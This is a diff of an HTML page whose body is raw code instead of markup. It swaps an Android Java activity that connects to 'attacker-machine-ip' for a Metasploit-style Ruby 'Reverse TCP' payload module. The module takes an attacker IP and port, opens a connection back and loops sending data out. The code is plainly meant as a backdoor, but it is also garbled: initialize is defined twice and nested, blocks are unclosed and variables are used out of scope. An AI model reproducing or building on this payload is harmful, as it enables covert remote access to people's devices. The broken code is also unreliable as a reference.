@@ -7,55 +7,83 @@
   </head>
   <body>
     <h2>hello</h2>
-import android.os.Bundle;
-
-import android.util.Log;
+require 'msf/core'
 
 
 
-public class ReverseTcpApk extends AppCompatActivity {
+class Payload < Msf::Payload
 
-private static final String TAG = "ReverseTcpApk";
+def initialize(info = {})
+
+super(update_info(info,
+
+'Name' => 'Reverse TCP',
+
+'Description' => %q{
+
+A reverse TCP payload that establishes a connection back to the attacker machine.
+
+},
+
+'Author' => ['eli'],
+
+'License' => MSF_LICENSE,
+
+'Platform' => [OS::Android],
+
+'Arch' => ARCH_ARMLE,
+
+))
 
 
 
-@Override
+register_options(
 
-protected void onCreate(Bundle savedInstanceState) {
+[
 
-super.onCreate(savedInstanceState);
+Opt::String.new('ATTACKER_IP', [true, "Attacker's IP address"]),
 
-setContentView(R.layout.activity_main);
+Opt::Int.new('ATTACKER_PORT', [true, "Attacker's port number"]),
+
+]
+  )
 
 
 
-// Establish reverse TCP connection
+def initialize
 
-new Thread(new Runnable() {
+super
 
-public void run() {
 
-try {
 
-Socket socket = new Socket("attacker-machine-ip", 8080);
+@attacker_ip = datastore['ATTACKER_IP']
 
-Log.d(TAG, "Connected to attacker machine!");
+@attacker_port = datastore['ATTACKER_PORT']
 
-// Send data over the socket...
 
-} catch (IOException e) {
 
-Log.e(TAG, "Error establishing connection: " + e.getMessage());
+# Establish reverse TCP connection
 
-}
+sock = Rex::Socket.create_tcp_client(@attacker_ip, @attacker_port)
 
-}
+print_status("Connected to attacker machine!")
 
-}).start();
+end
 
-}
 
-}
 
+def run
+
+while true do
+
+# Send data over the socket...
+
+send_data(sock.recv(1024))
+
+sleep 1
+
+end
+
+end
   </body>
 </html>
